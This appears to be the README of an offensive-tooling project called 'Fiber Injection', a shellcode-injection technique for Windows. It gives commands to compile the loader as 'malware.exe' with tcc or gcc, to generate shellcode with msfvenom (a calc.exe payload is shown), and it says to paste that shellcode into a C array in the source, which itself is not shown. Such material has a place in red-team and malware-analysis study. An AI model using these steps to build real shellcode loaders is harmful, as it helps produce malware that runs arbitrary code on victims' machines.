# 💉 Fiber Injection

> To compile code use tcc-compiler or gcc:
```shell
# tcc
tcc code.c -o malware.exe -m32

#gcc
gcc code.c -m32 -o malware.exe 
```
---
> To generate shellcode use msfvenom:
```shell
msfvenom -p windows/exec CMD='calc.exe' -f c
```

> And change this line to yours with shellcode:
```c
7    unsigned char shellcode[] = ""; // shellcode here
```